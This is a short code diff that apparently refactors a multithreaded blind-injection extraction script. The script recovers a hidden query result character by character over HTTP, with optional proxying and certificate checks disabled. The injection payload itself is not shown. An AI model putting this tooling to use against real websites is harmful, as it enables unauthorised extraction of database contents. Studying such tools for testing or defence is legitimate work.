@@ -86,9 +86,9 @@ def determine_response_char(task):
             resp = sess.send(prepped)
         else:
             resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
-        if is_true(resp):
-            response_char = chr(x)
-            return response_char
+        if is_true(resp): #he
+            task["result"] = str(chr(x))
+            return task
 
 def format_results(response_chars):
     results = [
@@ -102,20 +102,19 @@ def get_response_string(inner_query, url, no_proxy, num_threads):
     response_lenght = determine_response_length(inner_query, url, no_proxy) #here
     tasks = []
     for i in range(1, response_lenght + 1):
-        result = {"position": i, "url": url, "no_proxy": no_proxy, "inner_query": inner_query}# t2
+        result = {
+            "position": i,
+            "url": url, 
+            "no_proxy": no_proxy, 
+            "inner_query": inner_query,
+            }
         tasks.append(result)    
     response_chars = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
         results = [executor.submit(determine_response_char, task) for task in tasks]
         for f in concurrent.futures.as_completed(results):
             response_chars.append(f.result())
-    return format_results(response_chars)        
-            
-#    response_lenght = determine_response_length(inner_query, url, no_proxy)
-#    for i in range(1, response_lenght + 1):
-#        response_chars.append(determine_response_char(inner_query, i, url, no_proxy))
-#    return "".join(response_chars)
-
+    return format_results(response_chars)       
 
 def main(args):
     sess = requests.Session()
